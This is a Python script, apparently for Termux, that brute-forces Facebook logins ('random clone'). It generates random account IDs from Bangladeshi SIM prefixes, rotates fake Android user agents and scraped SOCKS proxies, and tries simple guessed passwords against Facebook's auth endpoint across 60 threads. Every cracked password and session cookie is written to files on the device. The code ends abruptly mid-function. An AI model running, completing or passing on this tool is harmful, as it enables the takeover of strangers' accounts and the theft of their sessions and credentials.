#====== SC SEND : KGF CYBER TEAM 
#=== NAME : KALYAN KING

#------------------[ MODULE ]-----------------#
 
import os,time,random,string,re
import sys,requests,json,uuid,mechanize
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime
from string import *
#------------------[ COLOR ]-----------------#
B = '\x1b[10;90m';R = '\x1b[10;91m';G = '\x1b[10;92m';H = '\x1b[10;93m';BL = '\x1b[10;94m';BG = '\x1b[10;95m';S = '\x1b[10;96m';W = '\x1b[10;97m';EX = '\x1b[0m';E = '\x1b[m'
#------------------[ SYTLE ]-----------------#
dt = '•'
#------------------[ VERSION ]-----------------#
version = '1.07'
#------------------[ LOOP ]-----------------#
ok = [];cp = [];twf = [];lop = 0;xode = [];plist = [];cpx = [];cokix = [];apkx = [];paswtrh = [];rcd = [];rcdx = [];ugen = [];ugtn = [];ugxn = [];lk = [];togg = []
#------------------[ CLEAR ]-----------------#
def clear():os.system("clear");print(logo)
#------------------[ LINE ]-----------------#
def line():print('===============================================')
#------------------[ DEVICE ]-----------------#
xxxxx = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820')
gtxx = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820')
gt = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820')
#------------------[ WEB ]-----------------#
fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
#------------------[ INSTALL ]-----------------#
os.system('pkg install sox -y')
os.system('pkg install espeak')
os.system('clear');os.system('espeak -a 300 "well,come to,team , rx tools"')
#------------------[ DATE ]-----------------#
dateti = str(datetime.now()).split(' ')[0]
#------------------[ PROXY ]-----------------#
proxylist = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
open('socksku.txt', 'w').write(proxylist)
proxsi = open('socksku.txt', 'r').read().splitlines()
#------------------[ KEY ]-----------------#

#------------------[ DATE-CHECKER ]-----------------#
def Nafijx(fx):
    if len(fx) == 15:
        if fx[:10] in ['1000000000']:
            Nafijxz = '2009'
            return Nafijxz
        if fx[:9] in ['100000000']:
            Nafijxz = '2009'
            return Nafijxz
        if fx[:8] in ['10000000']:
            Nafijxz = '2009'
            return Nafijxz
        if fx[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
            Nafijxz = '2009'
            return Nafijxz
        if fx[:7] in ['1000006', '1000007', '1000008', '1000009']:
            Nafijxz = '2010'
            return Nafijxz
        if fx[:6] in ['100001']:
            Nafijxz = '2010/2011'
            return Nafijxz
        if fx[:6] in ['100002', '100003']:
            Nafijxz = '2011/2012'
            return Nafijxz
        if fx[:6] in ['100004']:
            Nafijxz = '2012/2013'
            return Nafijxz
        if fx[:6] in ['100005', '100006']:
            Nafijxz = '2013/2014'
            return Nafijxz
        if fx[:6] in ['100007', '100008']:
            Nafijxz = '2014/2015'
            return Nafijxz
        if fx[:6] in ['100009']:
            Nafijxz = '2015'
            return Nafijxz
        if fx[:5] in ['10001']:
            Nafijxz = '2015/2016'
            return Nafijxz
        if fx[:5] in ['10002']:
            Nafijxz = '2016/2017'
            return Nafijxz
        if fx[:5] in ['10003']:
            Nafijxz = '2018/2019'
            return Nafijxz
        if fx[:5] in ['10004']:
            Nafijxz = '2019'
            return Nafijxz
        if fx[:5] in ['10005']:
            Nafijxz = '2020'
            return Nafijxz
        if fx[:5] in ['10006', '10007', '10008']:
            Nafijxz = '2021/2022'
            return Nafijxz
        Nafijxz = '2023'
        return Nafijxz
    if len(fx) in [9, 10]:
        Nafijxz = '2008/2009'
        return Nafijxz
    if len(fx) == 8:
        Nafijxz = '2007/2008'
        return Nafijxz
    if len(fx) == 7:
        Nafijxz = '2006/2007'
        return Nafijxz
    Nafijxz = '2023/2024'
    return Nafijxz
#------------------[ SIM-CODE ]-----------------#
BDX = f'''\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92m𝑩𝑫 𝑺𝑰𝑴 𝑪𝑶𝑫𝑬 : \x1b[10;91m• {G}013 014 015 016 017 018 019{E}{W}'''
#------------------[ LIMIT ]-----------------#
LIMITX = f'''[{G}+{W}] EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W}'''
#------------------[ YES/NO ]-----------------#
CPG = f'''[{G}+{W}] Do You Went Show Cp Account (y/n)'''
CKIG = f'''[{G}+{W}] Do You Went Show Cookie (y/n)'''
#------------------[ CHOICE/INPUT ]-----------------#
chc = f'''[{G}+{W}] \x1b[10;92mCHOOSE \x1b[10;91m•\x1b[10;92m '''
flp = f'''{W}[{G}•{W}] PUT FILE PATH\x1b[1;37m : {G}'''
#------------------[ EXAMPLE-PASS ]-----------------#
chcps = f'''EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}'''
#------------------[ METHOD ]-----------------#
mxxt = f'''{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}3{W}]'''
#------------------[ NOT-FOUND ]-----------------#
nflp = f'''[{R}!{W}] FILE LOCATION NOT FOUND '''
#------------------[ LOGO ]-----------------#
logo = """\r\r\x1b[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\x1b[10;91m ██      ██\x1b[0;92m  ██████ \x1b[10;91m ████████\x1b[0;92m ████████\x1b[10;91m      ██\x1b[0;92m    ║
║\x1b[10;91m ████    ██\x1b[0;92m ██    ██\x1b[10;91m ██      \x1b[0;92m    ██  \x1b[10;91m       ██\x1b[0;92m    ║
║\x1b[10;91m ██ ██   ██\x1b[0;92m ████████\x1b[10;91m ███████ \x1b[0;92m    ██  \x1b[10;91m       ██\x1b[0;92m    ║
║\x1b[10;91m ██  ██  ██\x1b[0;92m ██    ██\x1b[10;91m ██      \x1b[0;92m    ██  \x1b[10;91m ██    ██\x1b[0;92m    ║
║\x1b[10;91m ██   █████\x1b[0;92m ██    ██\x1b[10;91m ██      \x1b[0;92m ████████\x1b[10;91m  ██████ \x1b[0;92m   ║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•>\x1b[0;41m[ 𝚆𝙾𝚁𝙺𝙸𝙽𝙶 𝚆𝙸𝙵𝙸 + 𝙼𝙾𝙱𝙸𝙻𝙴 𝙳𝙰𝚃𝙰 ]\x1b[0;92m\x1b[10;91m<•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\x1b[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\x1b[1;33m 
\x1b[10;93m╠══[𝗔𝗨𝗧𝗛𝗢𝗥                    • \x1b[1;38m𝙍𝙓 𝙉𝘼𝙁𝙄𝙅 ]    ║ 
\x1b[10;91m╠══[𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞                  • 𝙉𝘼𝙁𝙄𝙅    ]    ║    
\x1b[10;97m╠══[𝗚𝗜𝗧𝗛𝗨𝗕                    • 𝙍𝙓-𝙉𝘼𝙁𝙄𝙅 ]    ║   
\x1b[10;94m╠══[𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠                  • 𝙏𝙀𝘼𝙈 𝙍𝙓  ]    ║ 
\x1b[10;95m╠══[𝗧𝗢𝗢𝗟𝗦                     • 𝙁𝙍𝙀𝙀     ]    ║    
\x1b[10;93m╠══[𝗩𝗘𝗥𝗦𝗜𝗢𝗡                   • 2.1      ]    ║ \x1b[10;92m
\x1b[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\x1b[0m"""
#------------------[ NAME ]-----------------#
#------------------[ MENU ]-----------------#
def Main():
    clear()
    print('\x1b[10;92m┏━\x1b[10;97m=============================================')
    print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m1\x1b[10;97m] \x1b[10;92m𝗥𝗔𝗡𝗗𝗢𝗠 𝗖𝗟𝗢𝗡𝗘 \x1b[10;97m')
    print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m2\x1b[10;97m] \x1b[10;93m𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗪𝗜𝗧𝗛 𝗔𝗗𝗠𝗜𝗡')
    print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m0\x1b[10;97m] \x1b[10;91m𝗘𝗫𝗜𝗧')
    print('\x1b[10;92m┣━\x1b[10;97m=============================================')
    ghx = input('\x1b[10;92m┗━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92m𝘾𝙃𝙊𝙊𝙎𝙀 \x1b[10;91m:\x1b[10;92m ')
    if ghx in ['A', 'a', '1']:rcd.append('1');rmenu1()
    if ghx in ['B', 'b', '2']:rcd.append('2');rmenu1()
    if ghx in ['C', 'c', '3']:rcd.append('3');rmenu1()
    if ghx in ['C', 'c', '4']:rcd.append('4');rmenu1()
    else:line();print(f'\n \t {R}Choose Valid Option{E}');time.sleep(1);Main()
#------------------[ RANDOM-MENU ]-----------------#
def rmenu1():
    clear()
    if '1' in rcd:print(f'{BDX}');line()
    if '3' in rcd:print(f'{INDX}');line()
    if '2' in rcd:print('                [10;92mAdmin TELIGERM idz');os.system('xdg-open https://t.me/+ySgl6S0nEZwwYWFl');time.sleep(3)
    code = input(f'{chc}');print(f'''\x1b[10;97m{'==============================================='}''');print(f'''{LIMITX}''');line();limit = int(input(f'[{G}+{E}] Limit : {G}'));print(f"{W}{'==============================================='}");print(f'{CPG}');line();cx = input(f'{chc}')
    if cx in ['n', 'N', 'no', 'NO', '2']:cpx.append('n')
    else:cpx.append('y')
    print(f"{W}{'==============================================='}");print(f'{CKIG}');line();ckiv = input(f'{chc}')
    if ckiv in ['n', 'N', 'no', 'NO', '2']:cokix.append('n')
    else:cokix.append('y')
    for number in range(limit):
        if '1' in rcd:numberx = ''.join((random.choice(string.digits) for _ in range(8)));xode.append(numberx)
        if '2' in rcd:numberx = ''.join((random.choice(string.digits) for _ in range(7)));xode.append(numberx)
        if '3' in rcd:numberx = ''.join((random.choice(string.digits) for _ in range(6)));xode.append(numberx)
    with ThreadPool(max_workers=60) as tonxoys:
        tid = str(len(xode));clear()
        print('\x1b[10;92m┏━\x1b[10;97m=============================================')        
        print(f'''\x1b[10;92m┣━{W}[{G}+{W}] \x1b[10;91m𝗬𝗢𝗨𝗥 𝗧𝗢𝗧𝗔𝗟 𝗜𝗗 :\x1b[1;92m ''' + tid)
        print(f'''\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m]\x1b[10;92m 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 𝗧𝗜𝗠𝗘 𝗗𝗔𝗧𝗘 \x1b[10;91m: \x1b[10;93m{dateti}''')
        print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[38;5;208m𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 \x1b[10;95m𝗔𝗜𝗥𝗣𝗟𝗔𝗡𝗘 𝗠𝗢𝗢𝗗 \x1b[10;97m[\x1b[10;92m𝙊𝙉\x1b[10;91m/\x1b[10;92m𝙊𝙁𝙁\x1b[10;97m] \x1b[10;92m𝗔𝗙𝗧𝗘𝗥\x1b[10;91m-\x1b[10;92m 3 𝗠𝗜𝗡𝗨𝗧𝗘')
        print('\x1b[10;92m┗━\x1b[10;97m=============================================')
        for rngx in xode:
            id = code + rngx
            if '1' in rcd:psd = [id,rngx,id[:6],id[:7],id[:8],id[5:]]
            if '2' in rcd:psd = [id,rngx,id[5:],'khan123']
            if '3' in rcd:psd = [id,rngx,id[:6],'57273200']
            tonxoys.submit(graphrm, id, psd, tid)
#------------------[ METHOD-1 ]-----------------#
def graphrm(id,psd,tid):
    global ok,cp,lop
    sys.stdout.write(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;97m[\x1b[10;92m𝙉𝘼𝙁𝙄𝙅j\x1b[10;97m-\x1b[10;92mM1\x1b[10;97m]>~[\x1b[10;92m{lop}\x1b[10;97m]>~<[\x1b[10;92m{tid}\x1b[10;97m]>~[\x1b[10;92mOK\x1b[10;91m•\x1b[10;92m%s\x1b[10;91m/\x1b[10;93m%s\x1b[10;97m] ''' % (len(ok), len(lk)));sys.stdout.flush()
    for psw in psd:
        vchrome = str(random.randint(100, 925)) + '.0.0.' + str(random.randint(1, 8)) + '.' + str(random.randint(40, 150))
        VAPP = random.randint(410000000, 499999999)
        gtt = random.choice(xxxxx)
        gttt = random.choice(xxxxx)
        ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {str(gtt)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ' + '[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
        datax = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': id, 'password': psw, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'en_GB': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
        header = {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
        twfx = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
        lo = requests.post('https://b-graph.facebook.com/auth/login', data=datax, headers=header, allow_redirects=False).json()
        if 'session_key' in lo:
            cki = lo['session_cookies']
            ck = {}
            for xk in cki:
                ck.update({xk['name']: xk['value']})
            coki = ';'.join(['%s=%s' % (key, value) for key, value in ck.items()])
            iid = re.findall('c_user=(.*);xs', coki)[0]
            print(f'''\r\r\x1b[10;92m[𝗡𝗔𝗙𝗜𝗝-𝗢𝗞💚] {iid} | {psw} \x1b[10;91m•> \x1b[10;92m{Nafijx(iid)}''')
            os.system('espeak -a 300 "Nafij,  Ok,  id"')
            ok.append(id)
            open('/sdcard/rxrandomOK.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '  ------------>>>' + coki + '\n')
            if 'y' in cokix:
                print(f'''\r\r\x1b[10;93m[🌺] \x1b[10;91m= \x1b[10;93m𝐂𝐎𝐎𝐊𝐈𝐄𝐒\x1b[10;91m •  \x1b[10;94m{coki}{E}''')
                print(f'''\x1b[10;97m{'==============================================='}{E}''')
            break
        else:
            if twfx in str(lo):
                iid = lo['error']['error_data']['uid']
                print(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;96m[Nafij-2F] {iid} | {psw}{W}''')
                os.system('espeak -a 300 \"2F\"')
                open('/sdcard/rxrandom2F.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '\n')
                twf.append(id)
                break
            if 'www.facebook.com' in lo['error']['message']:
